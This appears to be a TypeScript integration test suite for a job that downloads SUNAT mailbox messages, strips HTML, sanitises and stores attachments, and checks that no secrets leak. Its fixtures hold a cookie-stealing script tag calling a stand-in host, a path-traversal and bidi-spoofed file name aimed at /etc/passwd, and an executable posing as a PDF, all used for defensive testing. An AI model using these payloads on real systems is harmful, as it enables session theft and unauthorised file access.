import { randomBytes } from "node:crypto";
import type { ContappDb } from "@contapp/db";
import { MockStorage } from "@contapp/storage";
import type { AdjuntoSol } from "@contapp/sunat";
import type { Redis } from "ioredis";
import {
  afterAll,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from "vitest";
import {
  arrancar007b,
  esperarTerminal,
  guardarCredencial,
  type FilaTrabajo,
} from "../../../test/procesadores-007b.js";
import {
  AlmacenControlado,
  EscenarioBuzon,
  MiB,
  PortalControlado,
  TOPE_ADJUNTO,
  TOPE_MENSAJE,
  adjuntosDe,
  comun,
  descifradosDe,
  encolarAbrir,
  insertarMensajeAdmin,
  mensajeDe,
  notificacionesTipo,
  sha256,
  volcarTrazas,
  type Mundo,
} from "../../../test/buzon.js";
import {
  asignarResponsable,
  auditoriaDe,
  limpiarFilas017,
} from "../../../test/notificaciones.js";
import { canario, fugas, loggerEspia, volcado } from "../../../test/soporte.js";
import {
  conectarRedis,
  crearDbAdmin,
  crearDbRol,
  esperarHasta,
  fijarConfig,
  limpiarPrefijo,
  minimoTx,
  nuevoPrefijo,
  restaurarConfig,
  volcarPrefijo,
  type ProcesoWorker,
} from "../../../test/trabajos.js";

// Spec 023, T5 (rojo; integración con PostgreSQL y Redis reales, BullMQ real, un doble de `SolPortal` y un storage en memoria):
// el procesador `sol.buzon.abrir` (D-1, D-3, D-4, D-10, P-1, P-10; CA-4, CA-8, CA-10, CA-11). Se encola como el backend (rol
// backend, `interactivo`, `{mensajeId}`) y lo ejecuta el worker.
// CONTRATO que fija (T12), además del de test/buzon.ts:
// - Si `contenido_ruta` ya existe, termina sin llamar al portal. Si no, descifra (una vez), llama a `obtenerMensaje` con los topes
//   de 20 MiB por adjunto y 50 MiB por mensaje y SIN transacción abierta, convierte el HTML a texto plano (el texto se guarda tal
//   cual), prepara los adjuntos con el dominio, escribe a storage con rutas `buzon/{tenant}/{cliente}/{uuid}.{ext}` y luego, en
//   UNA transacción, inserta los adjuntos (guardados y omitidos) y fija `contenido_ruta`, `contenido_bytes`,
//   `contenido_obtenido_en` (y `leido_sunat` si el portal declaró `marcaLeido`). Si algo falla borra lo escrito.
// - `resultado` = {adjuntos, omitidos, marcoLeido}. Un mensaje que no es del cliente del trabajo o no existe: `ErrorDatos`
//   (`error/datos_invalidos`) sin llamar al portal.
// - Auditoría `buzon.contenido_obtenido` (actor `trabajo`, datos {mensajeId, marcoLeido, adjuntos, omitidos}) por trigger de 0056.

vi.setConfig({ testTimeout: 150_000, hookTimeout: 60_000 });

const REINTENTOS = 2;
let admin: ContappDb;
let backend: ContappDb;
let redis: Redis;
let e: EscenarioBuzon;
let prefijo = nuevoPrefijo();
const prefijos = [prefijo];
let entornoAnterior: string | undefined;

beforeEach(() => {
  prefijo = nuevoPrefijo();
  prefijos.push(prefijo);
});

beforeAll(async () => {
  entornoAnterior = process.env.BUZON_PROGRAMADOR;
  process.env.BUZON_PROGRAMADOR = "off";
  admin = crearDbAdmin();
  backend = crearDbRol("contapp_backend");
  redis = conectarRedis();
  e = new EscenarioBuzon(admin);
  await fijarConfig(admin, "sol", {
    global: 4,
    tenant: 2,
    espera: 0,
    reintentos: REINTENTOS,
    base: 100,
  });
});

afterAll(async () => {
  if (entornoAnterior === undefined) delete process.env.BUZON_PROGRAMADOR;
  else process.env.BUZON_PROGRAMADOR = entornoAnterior;
  await admin?.pool
    .query("drop trigger if exists prueba_023w_falla on buzon_adjunto")
    .catch(() => undefined);
  await restaurarConfig(admin).catch(() => undefined);
  await limpiarFilas017(admin, e?.estudios ?? []).catch(() => undefined);
  await e?.limpiar();
  for (const x of prefijos)
    await limpiarPrefijo(redis, x).catch(() => undefined);
  redis?.disconnect();
  await Promise.all([backend?.close(), admin?.close()]);
});

// ---------------------------------------------------------------------------------------------------------------
// Soporte local
// ---------------------------------------------------------------------------------------------------------------

interface M extends Mundo {
  secretos: { usuario: string; clave: string };
}

async function mundo(): Promise<M> {
  const T = await e.estudio();
  await e.usuario(T, "dueno");
  const u = await e.usuario(T, "contador");
  const c = await e.cliente(T);
  await asignarResponsable(admin, T, c.id, u);
  const secretos = {
    usuario: canario("usuario_sol"),
    clave: canario("clave_sol"),
  };
  await guardarCredencial(backend, T, c.id, "sol", secretos);
  return { T, u, c, secretos };
}

const pdf = (extra = 2000): Buffer =>
  Buffer.concat([Buffer.from("%PDF-1.7\n"), randomBytes(extra)]);
const pdfGrande = (bytes: number): Buffer => {
  const b = Buffer.alloc(bytes);
  b.write("%PDF-1.7\n");
  return b;
};
const adj = (idSunat: string, nombre: string, bytes: Buffer): AdjuntoSol => ({
  idSunat,
  nombre,
  bytes,
});

interface Preparado {
  m: M;
  mensajeId: string;
  portal: PortalControlado;
  almacen: AlmacenControlado;
}

/** Un mensaje ya capturado (sin contenido) que el portal sabe abrir. */
async function preparar(
  o: {
    idSunat?: string;
    contenido?: { formato: "texto" | "html"; cuerpo: string };
    adjuntos?: AdjuntoSol[];
    m?: M;
  } = {},
): Promise<Preparado> {
  const m = o.m ?? (await mundo());
  const idSunat = o.idSunat ?? "AB-1";
  const adjuntos = o.adjuntos ?? [];
  const mensajeId = await insertarMensajeAdmin(admin, m.T, m.c.id, {
    idSunat,
    adjuntosDeclarados: adjuntos.length,
  });
  const portal = new PortalControlado().buzon(m.c.ruc, [
    comun(idSunat, 1, {
      contenido: o.contenido ?? { formato: "texto", cuerpo: "Cuerpo" },
      adjuntos: adjuntos.map((a) => ({ idSunat: a.idSunat, nombre: a.nombre })),
      adjuntosBytes: adjuntos,
    }),
  ]);
  return { m, mensajeId, portal, almacen: new AlmacenControlado() };
}

async function conWorker<T>(
  p: Pick<Preparado, "portal"> & { almacen?: unknown },
  fn: (w: ProcesoWorker) => Promise<T>,
  extra: Record<string, unknown> = {},
): Promise<T> {
  const w = await arrancar007b({
    prefijo,
    solPortal: p.portal,
    ...(p.almacen === undefined ? {} : { storage: p.almacen }),
    ...extra,
  } as Parameters<typeof arrancar007b>[0]);
  p.portal.contarTx = () => w.dbEstado.abiertas;
  try {
    return await fn(w);
  } finally {
    await w.detener({ esperaMs: 2000 });
  }
}

/** Encola «Abrir» y espera su fin. */
async function abrir(p: Preparado, timeoutMs = 40_000): Promise<FilaTrabajo> {
  const { id } = await encolarAbrir(backend, redis, prefijo, p.m, p.mensajeId);
  return esperarTerminal(e, id, timeoutMs);
}

const resultadoDe = (f: FilaTrabajo): Record<string, unknown> =>
  (f as { resultado?: Record<string, unknown> }).resultado ?? {};

const texto = async (a: AlmacenControlado, ruta: string): Promise<string> =>
  Buffer.from(await a.leer(ruta)).toString("utf8");

const reRuta = (m: M, ext: string): RegExp =>
  new RegExp(
    `^buzon/${m.T}/${m.c.id}/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\\.${ext}$`,
  );

// ---------------------------------------------------------------------------------------------------------------
// CA-4, CA-8: contenido
// ---------------------------------------------------------------------------------------------------------------

describe("CA-4, CA-8: contenido del mensaje", () => {
  it("guarda el HTML como texto plano (sin script, estilos ni comentarios) y marca leído lo que SUNAT marcó", async () => {
    const p = await preparar({
      contenido: {
        formato: "html",
        cuerpo:
          '<p>Estimado contribuyente,</p><script>fetch("//x/"+document.cookie)</script>' +
          '<p onclick="robar()">Su deuda es S/ 1 &amp; 20 &#37;</p><style>body{color:red}</style>' +
          "<!-- oculto --><br>Fin",
      },
    });
    const f = await conWorker(p, () => abrir(p), { storage: p.almacen });
    expect([f.estado, f.motivo]).toEqual(["completado", null]);
    expect(resultadoDe(f)).toEqual({
      adjuntos: 0,
      omitidos: 0,
      marcoLeido: true,
    });

    const fila = await mensajeDe(admin, p.m.c.id, "AB-1");
    expect(fila.contenido_ruta).toMatch(reRuta(p.m, "[a-z0-9]+"));
    expect(fila.contenido_obtenido_en).not.toBeNull();
    expect(fila.leido_sunat).toBe(true);
    const guardado = await texto(p.almacen, fila.contenido_ruta!);
    expect(guardado).toContain("Estimado contribuyente,");
    expect(guardado).toContain("Su deuda es S/ 1 & 20 %");
    expect(guardado).toContain("Fin");
    for (const peligroso of [
      "<script",
      "fetch(",
      "onclick",
      "robar",
      "color:red",
      "oculto",
      "<p",
      "<style",
    ])
      expect(guardado, peligroso).not.toContain(peligroso);
    expect(fila.contenido_bytes).toBe(Buffer.byteLength(guardado, "utf8"));

    // El portal se llamó una vez, con los topes del dominio.
    expect(p.portal.llamadasObtener()).toBe(1);
    expect(p.portal.topes).toEqual([
      { maxBytesAdjunto: TOPE_ADJUNTO, maxBytesMensaje: TOPE_MENSAJE },
    ]);
    expect(await descifradosDe(admin, p.m.c.id)).toEqual([
      expect.objectContaining({ resultado: "ok" }),
    ]);
    expect(
      p.portal.credenciales.every((c) => c.claveSol === p.m.secretos.clave),
    ).toBe(true);

    // La obtención queda auditada por el trabajo (0056), solo con ids y conteos.
    const aud = await auditoriaDe(admin, p.m.T, "buzon.contenido_obtenido");
    expect(aud).toHaveLength(1);
    expect(aud[0]).toMatchObject({
      actor_tipo: "trabajo",
      entidad: "buzon_mensaje",
    });
    expect(aud[0]?.datos).toEqual({
      mensajeId: p.mensajeId,
      marcoLeido: true,
      adjuntos: 0,
      omitidos: 0,
    });
  });

  it("un contenido en texto se guarda tal cual", async () => {
    const cuerpo = "Línea 1\nSi A < B & C > D, avise.\n\tFin";
    const p = await preparar({ contenido: { formato: "texto", cuerpo } });
    await conWorker(
      p,
      async () => {
        expect((await abrir(p)).estado).toBe("completado");
      },
      { storage: p.almacen },
    );
    const fila = await mensajeDe(admin, p.m.c.id, "AB-1");
    expect(await texto(p.almacen, fila.contenido_ruta!)).toBe(cuerpo);
  });

  it("si SUNAT no marcó leído, `leido_sunat` y `marcoLeido` quedan en falso", async () => {
    const p = await preparar();
    p.portal.marcaLeidoAlAbrir = false;
    const f = await conWorker(p, () => abrir(p), { storage: p.almacen });
    expect(resultadoDe(f)).toMatchObject({ marcoLeido: false });
    expect((await mensajeDe(admin, p.m.c.id, "AB-1")).leido_sunat).toBe(false);
    const aud = await auditoriaDe(admin, p.m.T, "buzon.contenido_obtenido");
    expect(aud[0]?.datos).toMatchObject({ marcoLeido: false });
    expect(p.portal.leidosMarcados()).toEqual([]);
  });

  it("guarda con el storage de producción (MockStorage) bajo buzon/{estudio}/{cliente}/", async () => {
    const p = await preparar({
      contenido: { formato: "texto", cuerpo: "Cuerpo real" },
      adjuntos: [adj("RA-1", "carta.pdf", pdf(300))],
    });
    const storage = new MockStorage();
    const f = await conWorker(p, () => abrir(p), { storage });
    expect([f.estado, f.motivo]).toEqual(["completado", null]);
    const fila = await mensajeDe(admin, p.m.c.id, "AB-1");
    expect(fila.contenido_ruta).toMatch(reRuta(p.m, "[a-z0-9]+"));
    expect(
      Buffer.from(await storage.leer(fila.contenido_ruta!)).toString("utf8"),
    ).toBe("Cuerpo real");
    const [a] = await adjuntosDe(admin, fila.id);
    expect(a?.ruta).toMatch(reRuta(p.m, "pdf"));
    expect(
      Buffer.from(await storage.leer(a!.ruta!))
        .subarray(0, 5)
        .toString(),
    ).toBe("%PDF-");
  });
});

// ---------------------------------------------------------------------------------------------------------------
// CA-8, D-4, P-10: adjuntos
// ---------------------------------------------------------------------------------------------------------------

describe("CA-8: adjuntos", () => {
  it("guarda los permitidos con su SHA-256 y nombre saneado y omite los de MIME ajeno, de tamaño o que pasan el tope del mensaje", async () => {
    const bytesPdf = pdf();
    const bytesXml = Buffer.from(
      '<?xml version="1.0" encoding="UTF-8"?><resolucion><n>1</n></resolucion>',
    );
    const bytesHostil = pdf(500);
    const adjuntos: AdjuntoSol[] = [
      adj("A1", "Resolución 2026.pdf", bytesPdf),
      adj("A2", "detalle.xml", bytesXml),
      adj("A3", "../../etc/passwd\u0000‮gnp.pdf", bytesHostil),
      adj(
        "A4",
        "instalador.pdf",
        Buffer.concat([Buffer.from("MZ"), randomBytes(500)]),
      ),
      { idSunat: "A5", nombre: "enorme.pdf", omitido: "tamano" },
      adj("A6", "sobre-el-tope.pdf", pdfGrande(TOPE_ADJUNTO + 1)),
      adj("A7", "grande-1.pdf", pdfGrande(19 * MiB)),
      adj("A8", "grande-2.pdf", pdfGrande(19 * MiB)),
      adj("A9", "grande-3.pdf", pdfGrande(19 * MiB)),
    ];
    const p = await preparar({ adjuntos });
    const f = await conWorker(p, () => abrir(p, 120_000), {
      storage: p.almacen,
    });
    expect([f.estado, f.motivo]).toEqual(["completado", null]);
    expect(resultadoDe(f)).toEqual({
      adjuntos: 5,
      omitidos: 4,
      marcoLeido: true,
    });

    const filas = await adjuntosDe(admin, p.mensajeId);
    expect(filas.map((x) => x.id_sunat)).toEqual(
      adjuntos.map((a) => a.idSunat),
    );
    const por = Object.fromEntries(filas.map((x) => [x.id_sunat, x]));
    const originales = Object.fromEntries(
      adjuntos.map((a) => [a.idSunat, "bytes" in a ? a.bytes : null]),
    );

    // Guardados: ruta propia (sin el nombre), bytes idénticos en storage, SHA-256 y tamaño exactos, MIME por firma.
    for (const id of ["A1", "A2", "A3", "A7", "A8"]) {
      const fila = por[id]!;
      expect(fila.omitido, id).toBeNull();
      expect(fila.ruta, id).toMatch(reRuta(p.m, id === "A2" ? "xml" : "pdf"));
      const bytes = Buffer.from(await p.almacen.leer(fila.ruta!));
      expect(sha256(bytes).equals(fila.sha256!), id).toBe(true);
      expect(sha256(originales[id]!).equals(fila.sha256!), id).toBe(true);
      expect(fila.tamano, id).toBe(originales[id]!.byteLength);
    }
    expect(por["A1"]!.mime).toBe("application/pdf");
    expect(por["A2"]!.mime).toMatch(/xml/);
    // El nombre hostil queda saneado: sin rutas, NUL, controles ni bidi, y nunca en la ruta de storage.
    const hostil = por["A3"]!.nombre;
    expect(hostil).not.toMatch(/[\\/\u0000-\u001f‪-‮⁦-⁩]/);
    expect(hostil.length).toBeGreaterThan(0);
    expect(hostil.length).toBeLessThanOrEqual(120);
    for (const x of filas)
      expect(x.ruta ?? "").not.toMatch(/passwd|Resoluci|detalle|grande/);

    // Omitidos: con su motivo, sin ruta y sin nada escrito en storage.
    expect(
      Object.fromEntries(
        filas.filter((x) => x.omitido).map((x) => [x.id_sunat, x.omitido]),
      ),
    ).toEqual({ A4: "mime", A5: "tamano", A6: "tamano", A9: "tope_mensaje" });
    for (const id of ["A4", "A5", "A6", "A9"])
      expect(por[id]!.ruta, id).toBeNull();
    // 5 adjuntos + el contenido: nada más escrito.
    expect(p.almacen.rutas()).toHaveLength(6);
    expect(p.almacen.intentosGuardar).toHaveLength(6);
  });

  it("dos «Abrir» del mismo mensaje dejan un solo trabajo, un solo pedido al portal y los adjuntos una vez (CA-4, CA-11)", async () => {
    const p = await preparar({
      adjuntos: [adj("B1", "uno.pdf", pdf()), adj("B2", "dos.pdf", pdf())],
    });
    p.portal.pausar();
    await conWorker(
      p,
      async () => {
        const a = await encolarAbrir(backend, redis, prefijo, p.m, p.mensajeId);
        const b = await encolarAbrir(backend, redis, prefijo, p.m, p.mensajeId);
        expect(a.nuevo).toBe(true);
        expect(b.nuevo).toBe(false);
        expect(b.id).toBe(a.id);
        await esperarHasta(
          () => p.portal.enEspera() > 0,
          "el portal recibe el pedido",
        );
        p.portal.abrir();
        expect((await esperarTerminal(e, a.id)).estado).toBe("completado");
      },
      { storage: p.almacen },
    );
    expect(p.portal.llamadasObtenerDe("AB-1")).toBe(1);
    expect(await adjuntosDe(admin, p.mensajeId)).toHaveLength(2);
    expect(p.almacen.rutas()).toHaveLength(3);
  });

  it("una segunda apertura, ya terminada la primera, no llama al portal ni escribe nada", async () => {
    const p = await preparar({
      adjuntos: [adj("C1", "uno.pdf", pdf())],
      contenido: { formato: "texto", cuerpo: "Una vez" },
    });
    await conWorker(
      p,
      async () => {
        expect((await abrir(p)).estado).toBe("completado");
        const antes = await mensajeDe(admin, p.m.c.id, "AB-1");
        const rutas = p.almacen.rutas().sort();
        const guardados = p.almacen.intentosGuardar.length;

        const f = await abrir(p);
        expect([f.estado, f.motivo]).toEqual(["completado", null]);
        expect(p.portal.llamadasObtener()).toBe(1);
        expect(p.almacen.rutas().sort()).toEqual(rutas);
        expect(p.almacen.intentosGuardar).toHaveLength(guardados);
        const despues = await mensajeDe(admin, p.m.c.id, "AB-1");
        expect(despues.contenido_ruta).toBe(antes.contenido_ruta);
        expect(despues.contenido_obtenido_en).toEqual(
          antes.contenido_obtenido_en,
        );
        expect(await adjuntosDe(admin, p.mensajeId)).toHaveLength(1);
        expect(await descifradosDe(admin, p.m.c.id)).toHaveLength(1);
      },
      { storage: p.almacen },
    );
    expect(
      await auditoriaDe(admin, p.m.T, "buzon.contenido_obtenido"),
    ).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------------------------------------------
// Atomicidad: sin archivos sueltos
// ---------------------------------------------------------------------------------------------------------------

describe("CA-8: sin archivos sueltos si algo falla", () => {
  it("si la transacción de BD falla, todo lo escrito en storage se borra y no queda fila", async () => {
    const p = await preparar({
      adjuntos: [adj("T1", "ok.pdf", pdf()), adj("T2", "falla-tx.pdf", pdf())],
    });
    await admin.pool.query(
      `create or replace function public.prueba_023w_falla() returns trigger language plpgsql as
       $$ begin if new.nombre = 'falla-tx.pdf' then raise exception 'falla de prueba 023w'; end if; return new; end $$`,
    );
    await admin.pool.query(
      `create trigger prueba_023w_falla before insert on buzon_adjunto for each row execute function public.prueba_023w_falla()`,
    );
    try {
      const f = await conWorker(p, () => abrir(p), { storage: p.almacen });
      expect(f.estado).toBe("error");
    } finally {
      await admin.pool
        .query("drop trigger if exists prueba_023w_falla on buzon_adjunto")
        .catch(() => undefined);
      await admin.pool
        .query("drop function if exists public.prueba_023w_falla()")
        .catch(() => undefined);
    }
    const fila = await mensajeDe(admin, p.m.c.id, "AB-1");
    expect(fila.contenido_ruta).toBeNull();
    expect(await adjuntosDe(admin, p.mensajeId)).toHaveLength(0);
    expect(p.almacen.intentosGuardar.length).toBeGreaterThan(0);
    expect(p.almacen.rutas(), "ningún archivo suelto").toEqual([]);
    for (const ruta of p.almacen.intentosGuardar)
      expect(p.almacen.eliminados).toContain(ruta);
  });

  it("si el storage falla a mitad de la escritura, lo ya escrito se borra y el reintento deja solo lo que la BD referencia", async () => {
    const p = await preparar({
      adjuntos: [adj("S1", "uno.pdf", pdf()), adj("S2", "dos.pdf", pdf())],
    });
    p.almacen.fallarEnGuardado(2);
    const f = await conWorker(p, () => abrir(p), { storage: p.almacen });
    expect([f.estado, f.motivo]).toEqual(["completado", null]);
    expect(
      p.almacen.eliminados.length,
      "el primer intento limpió lo que alcanzó a escribir",
    ).toBeGreaterThanOrEqual(1);
    const fila = await mensajeDe(admin, p.m.c.id, "AB-1");
    const referenciadas = [
      fila.contenido_ruta!,
      ...(await adjuntosDe(admin, p.mensajeId)).map((a) => a.ruta!),
    ].sort();
    expect(referenciadas).toHaveLength(3);
    expect(p.almacen.rutas().sort()).toEqual(referenciadas);
    expect(await adjuntosDe(admin, p.mensajeId)).toHaveLength(2);
  });
});

// ---------------------------------------------------------------------------------------------------------------
// CA-7 aplicado a «Abrir», aislamiento y 008 D6
// ---------------------------------------------------------------------------------------------------------------

describe("«Abrir»: fallos del portal y mensajes ajenos", () => {
  it("ErrorCredencial: no guarda nada, la credencial queda `invalida`, se avisa una vez y no se reintenta", async () => {
    const p = await preparar({ adjuntos: [adj("E1", "uno.pdf", pdf())] });
    p.portal.fallar("credencial");
    const f = await conWorker(p, () => abrir(p), { storage: p.almacen });
    expect([f.estado, f.motivo]).toEqual(["error", "credencial_invalida"]);
    expect(p.portal.llamadasObtener(), "sin reintento").toBe(1);
    expect(
      (await mensajeDe(admin, p.m.c.id, "AB-1")).contenido_ruta,
    ).toBeNull();
    expect(await adjuntosDe(admin, p.mensajeId)).toHaveLength(0);
    expect(p.almacen.intentosGuardar).toEqual([]);
    expect(await e.credencialEstado(p.m.c.id)).toMatchObject({
      estado: "invalida",
    });
    expect(
      await notificacionesTipo(admin, p.m.T, p.m.c.id, "credencial_invalida"),
    ).toHaveLength(1);
  });

  it("ErrorTransitorio: se reintenta y los adjuntos quedan una vez", async () => {
    const p = await preparar({
      adjuntos: [adj("F1", "uno.pdf", pdf()), adj("F2", "dos.pdf", pdf())],
    });
    p.portal.fallar("transitorio", { veces: 1 });
    const f = await conWorker(p, () => abrir(p), { storage: p.almacen });
    expect([f.estado, f.motivo]).toEqual(["completado", null]);
    expect(p.portal.llamadasObtener()).toBe(2);
    expect(await adjuntosDe(admin, p.mensajeId)).toHaveLength(2);
    expect(p.almacen.rutas()).toHaveLength(3);
    expect(
      await auditoriaDe(admin, p.m.T, "buzon.contenido_obtenido"),
    ).toHaveLength(1);
  });

  it("un mensaje de otro cliente del estudio o inexistente: `datos_invalidos`, sin llamar al portal ni escribir", async () => {
    const p = await preparar();
    const otro = await e.cliente(p.m.T);
    await asignarResponsable(admin, p.m.T, otro.id, p.m.u);
    await guardarCredencial(backend, p.m.T, otro.id, "sol", p.m.secretos);
    const ajeno: M = { ...p.m, c: otro };
    await conWorker(
      p,
      async () => {
        // El mensaje de `p.m.c`, pedido como si fuera del otro cliente.
        const a = await encolarAbrir(
          backend,
          redis,
          prefijo,
          ajeno,
          p.mensajeId,
        );
        const fa = await esperarTerminal(e, a.id);
        expect([fa.estado, fa.motivo]).toEqual(["error", "datos_invalidos"]);
        // Un uuid que no existe.
        const b = await encolarAbrir(
          backend,
          redis,
          prefijo,
          p.m,
          "00000000-0000-4000-8000-000000000001",
        );
        const fb = await esperarTerminal(e, b.id);
        expect([fb.estado, fb.motivo]).toEqual(["error", "datos_invalidos"]);
      },
      { storage: p.almacen },
    );
    expect(p.portal.llamadasObtener()).toBe(0);
    expect(p.almacen.intentosGuardar).toEqual([]);
    expect(
      (await mensajeDe(admin, p.m.c.id, "AB-1")).contenido_ruta,
    ).toBeNull();
    expect(await e.credencialEstado(otro.id)).toMatchObject({
      estado: "configurada",
    });
  });

  it("el portal se llama sin ninguna transacción del worker abierta (008 D6)", async () => {
    const p = await preparar({ adjuntos: [adj("G1", "uno.pdf", pdf())] });
    p.portal.pausar();
    await conWorker(
      p,
      async (w) => {
        const { id } = await encolarAbrir(
          backend,
          redis,
          prefijo,
          p.m,
          p.mensajeId,
        );
        await esperarHasta(
          () => p.portal.enEspera() > 0,
          "el portal recibe el pedido",
        );
        expect(
          await minimoTx(w.dbEstado, 400),
          "una transacción abierta dejaría el mínimo en ≥ 1",
        ).toBe(0);
        p.portal.abrir();
        expect((await esperarTerminal(e, id)).estado).toBe("completado");
      },
      { storage: p.almacen },
    );
  });
});

// ---------------------------------------------------------------------------------------------------------------
// CA-10: canarios
// ---------------------------------------------------------------------------------------------------------------

describe("CA-10: canarios en usuario, clave, contenido y nombre de adjunto", () => {
  it("no aparecen en logs, `resultado`, trabajos, Redis, notificaciones, auditoría ni en las rutas de storage", async () => {
    const canContenido = canario("contenido");
    const canNombre = canario("adjunto");
    const p = await preparar({
      contenido: { formato: "html", cuerpo: `<p>${canContenido}</p>` },
      adjuntos: [adj("H1", `${canNombre}.pdf`, pdf())],
    });
    // El portal falla una vez con un mensaje que lleva todos los canarios: nada debe copiarlo.
    p.portal.fallar("error", {
      veces: 1,
      error: new Error(
        `portal: ${p.m.secretos.usuario} ${p.m.secretos.clave} ${canContenido} ${canNombre}`,
      ),
    });
    const espiaLog = loggerEspia();
    const f = await conWorker(p, () => abrir(p), {
      storage: p.almacen,
      logger: espiaLog.logger,
    });
    expect([f.estado, f.motivo]).toEqual(["completado", null]);

    const secretos = [
      p.m.secretos.usuario,
      p.m.secretos.clave,
      canContenido,
      canNombre,
    ];
    const dondeBuscar: Record<string, string> = {
      logs: volcado(espiaLog.llamadas),
      trazasBd: await volcarTrazas(admin, e.estudios),
      redis: await volcarPrefijo(redis, prefijo),
      resultado: JSON.stringify(resultadoDe(f)),
      rutas: p.almacen.rutas().join("\n"),
    };
    for (const [donde, t] of Object.entries(dondeBuscar))
      expect(fugas(t, secretos), donde).toEqual([]);
    expect(JSON.stringify(espiaLog.llamadas)).not.toContain(p.m.c.ruc);
    const auditoria = JSON.stringify(
      (await auditoriaDe(admin, p.m.T))
        .filter((a) => a.accion.startsWith("buzon."))
        .map((a) => a.datos),
    );
    expect(auditoria).not.toContain(p.m.c.ruc);
    // El contenido y el nombre sí están, pero solo donde corresponde.
    expect(
      await texto(
        p.almacen,
        (await mensajeDe(admin, p.m.c.id, "AB-1")).contenido_ruta!,
      ),
    ).toContain(canContenido);
    expect((await adjuntosDe(admin, p.mensajeId))[0]?.nombre).toContain(
      canNombre,
    );
  });
});
